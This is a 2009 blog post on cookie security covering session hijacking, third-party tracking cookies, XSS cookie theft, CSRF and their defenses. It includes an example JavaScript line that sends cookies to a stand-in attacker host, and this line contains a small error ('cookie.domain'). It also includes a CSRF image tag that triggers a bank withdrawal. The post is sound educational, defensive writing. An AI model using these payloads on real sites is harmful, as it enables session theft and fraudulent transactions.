---
title: Cookies and security
author: Nicholas C. Zakas
permalink: /blog/2009/05/12/cookies-and-security/
categories:
  - Web Development
tags:
  - Cookies
  - HTTP
  - JavaScript
  - Security
  - Session Hijacking
  - Web Development
  - XSS
---
In my [last post][1], I discussed the basics of HTTP cookies and how they work. Missing from that discussion was the topic of security, mostly because it is a discussion in and of itself. Indeed, it's hard to talk about cookies without talking about security implications since there are so many. Cookies would seem to have all the security they need by virtue of the `domain`, `path`, and `secure` options, but the nature of web pages complicates the matter significantly.

## User logins and session hijacking

One of the most common uses for cookies is to track user login state. The mechanism is quite simple: you go to a page and sign in with a username and password. If the information is valid, a cookie is sent with the next response that uniquely identifies the user. Each page in the site checks for that cookie in order to establish login credentials. As long as the cookie remains intact, you are verified as the user who originally logged in. Most sites set these cookies as session cookies, to be deleted when the browser closes, as a security measure to prevent you from remaining logged in unintentionally. Many login forms also offer a &#8220;remember me&#8221; checkbox to change this to a persistent cookie at the user's request. Even then, most systems have a limit of one or two weeks to prevent runaway login credentials that may risk the security of the user.

The problem with this system is that it leaves a single data point for user identification. Further, cookies are sent in plain text over the Internet, making them vulnerable to [packet sniffing][2] whereby someone intercepts traffic between a computer and the Internet. Once the value of a user's login cookie is taken, it can be used to simulate the same session elsewhere by manually setting the cookie. The server can't tell the difference between the original cookie that was set and the duplicated one that was stolen through packet sniffing, so it acts as if the user had logged in. This type of attack is called [session hijacking][3].There are a few ways to prevent session hijacking using cookies.

The first, and most common technique among the security-conscious, is to only send cookies over SSL. Since SSL encrypts the request on the browser before transmitting across the Internet, packet sniffing alone can't be used to identify the cookie value. Banks and stores use this technique frequently since user sessions are typically short in duration.

Another technique is to generate a session key in some random fashion and/or a way that is based on information about the user (username, IP address, time of login, etc.). This makes it more difficult to reuse a session key, though doesn't make it impossible.

Yet another technique is to re-validate the user before performing an activity deemed to be of a higher security level, such as transferring money or completing a purchase. For example, many sites require you to log in a second time before changing a password.

## Third-party cookies

Web pages allow inclusion of resources from anyplace on the web. For example, my site uses the [YUI CSS][4] foundation for its layout and therefore includes these files from the Yahoo! CDN at `yui.yahooapis.com` via a `<link>` tag. Due to cookie restrictions, the request to retrieve this CSS resource will not include the cookies for `nczonline.net`. However, `yui.yahooapis.com` could potentially return its own cookies with the response (it doesn't, it's a cookie-less server). The page at `nczonline.net` cannot access cookies that were sent by `yui.yahooapis.com` because the domain is different and vice-versa, but all the cookies still exist. In this case, `yui.yahooapis.com` would be setting a third-party cookie, which is a cookie tied to a domain separate from the containing page.

There are several ways to include resources from other domains in HTML:

  * Using a `<link>` tag to include a style sheet.
  * Using a `<script>` tag to include a JavaScript file.
  * Using an `<object>` or <embed> tag to include media files.
  * Using an `<iframe>` tag to include another HTML file.

In each case, an external file is referenced and can therefore return its own cookies. The interesting part is that with the request, these third-party servers receive an HTTP `Referer` heading (spelling is incorrect in the spec) indicating the page that is requesting the resource. The server could potentially use that information to issue a specific cookie identifying the referring page. If that same resource is then loaded from another page, the cookie would then be sent along with the request and the server can determine that someone who visited Site A also visited Site B. This is a common practice in online advertising. Such cookies are often called tracking cookies since their job is to track user movement from site to site. This isn't actually a security threat but is an important concept to understand in the larger security discussion.

### Cookie stealing and XSS

The ability to load JavaScript from a different domain onto the page opens up a particularly troublesome security hole. Even though the request for a third-party JavaScript resource doesn't include the containing page's cookies, the script can get access to them. All JavaScript on a page is considered to be running in the same domain, with the same path, and using the same protocol as the page itself. That means a script from loaded another domain will get that page's cookies by reading `document.cookie`.

As an example of how dangerous this is, suppose I load a script from `evil-domain.com` that contains some actually useful code. However, the folks at `evil-domain.com` then switch that code to the following:

    (new Image()).src = "http://www.evil-domain.com/cookiestealer.php?cookie=" + cookie.domain;

Now this code is loaded on my page and silently sends my cookies back to `evil-domain.com`. This happens to everyone who visits my site. Once they have my cookies, it's much easier to perpetrate other attacks including session hijacking. When an attack occurs due to injection of third-party JavaScript into a page, it's called a [cross-site scripting][5] (XSS) attack.

Cookie stealing doesn't occur just from including a malicious script on your page accidentally, it can also occur due to poor input filtering. A [simple example][6] of this is a page where the user can enter text that is output, as-is, into the page. If the text contains a `<script>` tag with the same code as above then cookies can once again be stolen.

XSS attacks like this have been perpetrated against large sites such as LiveJournal and [MySpace][7] in the past. The best protection comes in two forms:

  1. Don't include JavaScript from untrusted domains. The CDNs of large companies such as Yahoo!, Google, and AOL should be safe; use extreme caution when including from other locations.
  2. Filter out HTML from all user input or otherwise sanitize the input. Never accept user input and output onto a page without some sort of filtering.

This is precisely why HTTP-only cookies are an important addition to standard cookie implementations. If a cookie were marked as HTTP-only, then a malicious script wouldn't be able to access that cookie via document.cookie and therefore wouldn't be able to steal your cookies. When HTTP-only cookies are officially supported in all browsers, it will become a valid third option. Right now, it's a nice mitigation technique but not a preventative one.

### Cross-site request forgery (CSRF)

Another type of attack involving cookies is [cross-site request forgery][8] (CSRF). In this type of attack, the attacker is able to convince the browser to send a request on behalf of a logged-in user to do something malicious, such as transfer money into the attacker's bank account. This can be done using the same XSS techniques discussed earlier or by using simple HTML.

Wikipedia gives a good example of someone posting a message on a forum where there is no input filtering. A user can therefore include an image that isn't really an image, it's a request to your bank's server to withdraw money, such as:

    <img src="http://bank.example/withdraw?account=bob&amount=1000000&for=mallory">

If you were logged in to bank.example, meaning your cookies were still valid, then the request would be sent as soon as you viewed the forum message. The bank would validate the request because the proper cookies were sent even though you didn't initiate the request through some action.

As with XSS, input filtering is an important tool in prevent CSRF attacks. There are a few others as well:

  * Require confirmation for any sensitive action. In this example, the page at bank.example should not initiate the withdrawal. Instead, it should display a confirmation page that requires you to validate the action being requested. The validation may include another login screen for extra security.
  * Cookies that validate users in systems with sensitive data should have a short expiration time. In some cases, an expiration period of a few minutes may be necessary.
  * Require validation not just with cookies, but also by referrer and/or request type (POST instead of GET).

CSRF attacks can be particularly tricky to track down once initiated, so prevention is key.

## Conclusion

With all of the security issues surrounding cookies, is it safe to use them? The answer is yes so long as you take the proper precautions to protect your users and systems from XSS and CSRF attacks. Input validation alone decreases the number of attacks that can be executed on your site, and it's a very low-cost addition that pays off in big ways. There are a lot of big companies that rely on cookies for identifying their users and do so in a safe way. The most important thing you can do when using cookies is to stay informed about security issues and the latest techniques for preventing attacks.

 [1]: https://humanwhocodes.com/blog/2009/05/05/http-cookies-explained/
 [2]: http://en.wikipedia.org/wiki/Packet_sniffing
 [3]: http://en.wikipedia.org/wiki/Session_hijacking
 [4]: http://developer.yahoo.com/yui/3/cssbase/
 [5]: http://en.wikipedia.org/wiki/Cross-site_scripting
 [6]: http://www.steve.org.uk/Hacks/XSS/simple.html
 [7]: http://namb.la/popular/tech.html
 [8]: http://en.wikipedia.org/wiki/Cross-site_request_forgery
